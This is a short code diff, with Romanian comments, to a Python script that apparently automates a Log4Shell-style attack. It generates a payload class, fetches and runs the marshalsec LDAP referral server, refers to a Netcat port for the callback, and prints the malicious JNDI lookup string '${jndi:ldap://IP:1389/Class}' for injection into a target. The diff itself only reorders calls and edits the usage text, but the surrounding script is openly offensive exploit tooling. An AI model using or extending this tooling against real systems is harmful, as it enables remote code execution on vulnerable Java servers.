@@ -213,7 +213,7 @@ def marshalsec(java_command):
 
 def main():
     parser = argparse.ArgumentParser(description='''Un script care primește IP-ul, portul și numele clasei java. 
-    Usage: python script.py --ip <IP> --port <Port> --nume_clasa <Nume>''')
+    Usage: python3 application.py --ip <IP> --port <Port> --nume_clasa <Nume>''')
     
     parser.add_argument('--ip', type=str, help='Adresa IP a serveului LDAP')
     parser.add_argument('--port', type=int, help='Portul Netcat')
@@ -236,6 +236,9 @@ def main():
     # Generam payloadul
     generate_payload(args.ip, args.port, args.nume_clasa)
     
+    # Clonam aplicatia marshalsec
+    marshalsec_fetch()
+    
     # Comanda pentru a rula procesul Java
     java_command = [
         "java", "-cp", "marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar",
@@ -246,8 +249,8 @@ def main():
     print(f'Numele: {args.nume_clasa}')
     print(java_command)
     print(f'Introduceti stringul malitios: ${{jndi:ldap://{args.ip}:1389/{args.nume_clasa}}}')
-    
-    marshalsec_fetch()
+	
+	# Rulam serverul LDAP
     marshalsec(java_command)
 
     # Așteptăm terminarea serverului HTTP (thread-ul va rula indefinit)
